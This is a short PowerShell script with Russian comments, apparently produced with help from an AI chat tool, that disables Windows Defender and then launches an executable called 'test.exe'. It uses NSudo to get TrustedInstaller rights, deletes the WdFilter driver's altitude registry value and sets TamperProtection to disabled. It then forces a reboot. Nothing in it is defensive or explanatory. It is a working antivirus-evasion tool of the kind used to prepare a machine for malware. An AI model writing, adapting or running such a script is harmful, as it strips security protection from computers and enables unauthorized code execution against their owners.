# 1. Проверяем, не отключена ли уже защита
$status = Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
if ($status -eq $true) {
    Write-Host "Защита уже отключена, запускаю основной EXE..."
    # Если защита выключена, то сразу запускаем твой test.exe
    Start-Process -FilePath "test.exe"
    exit
}

# 2. Если нет, пробуем обойти защиту от подделки
Write-Host "Пытаюсь обойти Tamper Protection..."

# 3. Получаем путь к утилите NSudo (ее нужно будет положить рядом)
$nsudo = "NSudoLC.exe"

# 4. Выполняем ключевую команду с правами TrustedInstaller для отключения драйвера WdFilter.
#    Важно: команда для удаления ключа драйвера должна быть заключена в кавычки.
$command = 'reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance" /v Altitude /f'

# Запускаем NSudo с нужными правами. -U:T означает TrustedInstaller, -P:E - все права [citation:1]
& $nsudo -U:T -P:E cmd /c $command

# 5. После удаления ключа драйвера, отключаем саму Tamper Protection
$tpCommand = 'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 4 /f'
& $nsudo -U:T -P:E cmd /c $tpCommand

Write-Host "Команды выполнены. Требуется перезагрузка!"
Read-Host "Нажмите Enter, чтобы перезагрузить компьютер"
shutdown /r /t 0